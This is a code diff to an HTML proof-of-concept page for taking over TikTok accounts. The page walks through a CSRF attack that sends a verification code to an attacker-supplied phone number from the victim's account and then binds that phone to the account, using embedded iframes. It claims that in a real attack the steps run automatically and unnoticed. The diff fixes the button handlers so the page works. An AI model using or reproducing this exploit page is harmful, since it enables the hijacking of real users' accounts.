@@ -48,17 +48,17 @@
               document.getElementById("encryptedcode").innerHTML=en;
             }
 </script>
-<h1>takeover victim account on tiktok</h1>
+<h1 style="text-align:center;">takeover victim account on tiktok</h1>
 <h2>Hi this is a POC for takeover tiktok account,I will explain the account takeover vulnerability steps separately, hoping to make people understand the principle of the breakthrough. In a real attack, these steps are automatic and continuous, and the victim will not find anything.</h2>
 <h3>Before start attack,please set attacker's phone number for encrypted</h3>
 Your phone number for account takeover(pattern:+86XXXXXXX): <input type="text" name="attackermobile" id="attackermobilenum">
-<input type="submit" value="Encryped!" onclick="mobileEncrypted"/>
+<input type="submit" value="Encryped!" onclick="mobileEncrypted()"/>
 <textarea id="encryptedmobile" width="100" height="20"></textarea>
 <h3>Step 1--Using CSRF vulnerability to get the verify code from attacker mobile on victim account</h3>
 <iframe src=/get_code.html></iframe>
 <h3>Step 2--Input the verify code from attacker mobile then encrypted</h3>
 Your verify code from attacker mobile: <input type="text" name="attackercode" id="attackercodeid">
-<input type="submit" value="Encryped!" onclick="codeEncrypted"/>
+<input type="submit" value="Encryped!" onclick="codeEncrypted()"/>
 <textarea id="encryptedcode" width="100" height="20"></textarea>
 <h3>Step 3--Input the encrpted mobile number and verify code from attacker and click the botton then the attacker mobile will blind on victim account</h3>
 <iframe src=/takeover_account.html></iframe>
